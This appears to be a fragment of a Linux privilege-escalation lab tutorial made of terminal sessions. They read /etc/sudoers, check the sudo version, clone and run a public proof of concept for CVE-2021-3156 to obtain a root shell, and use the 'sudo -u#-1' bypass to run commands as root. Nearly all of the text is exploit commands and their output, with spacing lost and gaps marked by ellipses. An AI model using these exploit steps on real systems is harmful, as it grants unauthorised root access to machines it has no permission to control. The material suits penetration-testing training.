...
```
`cry0l1t3@nix02:~$sudocat/etc/sudoers|grep-v"#"|sed-r'/^\s*$/d'[sudo] password for cry0l1t3:  **********
...
```
`cry0l1t3@nix02:~$sudo-V|head-n1Sudo version 1.8.31`
```
...
```
`cry0l1t3@nix02:~$gitclone https://github.com/blasty/CVE-2021-3156.gitcry0l1t3@nix02:~$cdCVE-2021-3156cry0l1t3@nix02:~$makerm -rf libnss_X
mkdir libnss_X
...
```
`cry0l1t3@nix02:~$./sudo-hax-me-a-sandwich** CVE-2021-3156 PoC by blasty <peter@haxx.in>
...
```
`cry0l1t3@nix02:~$cat/etc/lsb-releaseDISTRIB_ID=Ubuntu
...
```
`cry0l1t3@nix02:~$./sudo-hax-me-a-sandwich1** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **#iduid=0(root) gid=0(root) groups=0(root)`
```
...
```
`cry0l1t3@nix02:~$sudo-l[sudo] password for cry0l1t3: **********
...
```
`cry0l1t3@nix02:~$cat/etc/passwd|grepcry0l1t3cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash`
```
...
```
`cry0l1t3@nix02:~$sudo-u#-1 idroot@nix02:/home/cry0l1t3#iduid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)`
```